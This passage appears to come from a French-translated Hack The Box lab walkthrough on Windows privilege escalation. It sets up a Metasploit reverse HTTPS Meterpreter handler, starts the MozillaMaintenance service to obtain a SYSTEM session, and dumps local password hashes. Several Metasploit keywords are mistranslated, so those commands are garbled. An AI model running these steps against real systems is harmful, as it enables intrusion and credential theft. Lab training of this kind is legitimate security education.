Astuce Metasploit : utilisez la commande resource pour exécuter des commandes à partir d'un fichier

[*] Traitement de handler.rc pour les directives ERB.
ressource (handler.rc)> utiliser exploit/multi/handler
[*] Utilisation de la charge utile configurée generic/shell_reverse_tcp
ressource (handler.rc)> définir PAYLOAD windows/x64/meterpreter/reverse_https
PAYLOAD => windows/x64/meterpreter/reverse_https
ressource (handler.rc)> définir LHOST 10.10.14.3
LHOST => 10.10.14.3
ressource (handler.rc)> définir LPORT 8443
LPORT => 8443
ressource (handler.rc)> exploiter
[*] Démarrage du gestionnaire inverse HTTPS sur https://10.10.14.3:8443

```

#### Démarrage du service

Démarrez le service et nous devrions obtenir une session en tant que `NT AUTHORITY\SYSTEM`.

Démarrage du service

```
C:\htb> net start MozillaMaintenance

Le service ne répond pas à la fonction de contrôle

Plus d'aide est disponible en tapant NET HELPMSG 2186

```

#### Recevoir une session Meterpreter

Nous obtiendrons une erreur en essayant de démarrer le service, mais nous recevrons toujours un rappel une fois le binaire Meterpreter exécuté.

Recevoir une session Meterpreter

```
[*] Démarrage du gestionnaire inverse HTTPS sur https://10.10.14.3:8443
[*] https://10.10.14.3:8443 demande de traitement du 10.129.43.13 ; (UUID : syyuxztc) Charge utile x64 intermédiaire (201 308 octets)...
[*] Session Meterpreter 1 ouverte (10.10.14.3:8443 -> 10.129.43.13:52047) au 2021-05-14 13:38:55 -0400

meterpreter > getuid

Nom d'utilisateur du serveur : NT AUTHORITY\SYSTEM

meterpreter > sysinfo

Ordinateur : WINLPE-WS02
Système d'exploitation : Windows 10 (10.0 Build 18363).
Architecture : x64
Langue du système : en_US
Domaine : GROUPE DE TRAVAIL
Utilisateurs connectés : 6
Meterpreter : x64/windows

meterpreter > hashdump

Administrateur :500 :aad3b435b51404eeaad3b435b51404ee :31d6cfe0d16ae931b73c59d7e0c089c0 :: :
Compte par défaut : 503 : aad3b435b51404eeaad3b435b51404ee : 31d6cfe0d16ae931b73c59d7e0c089c0 :: :
Invité:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 :::
htb-étudiant:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6 :::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58 :::
Compte utilitaire WDAG : 504 : aad3b435b51404eeaad3b435b51404ee : c93428723187f868ae2f99d4fa66dceb :: :

```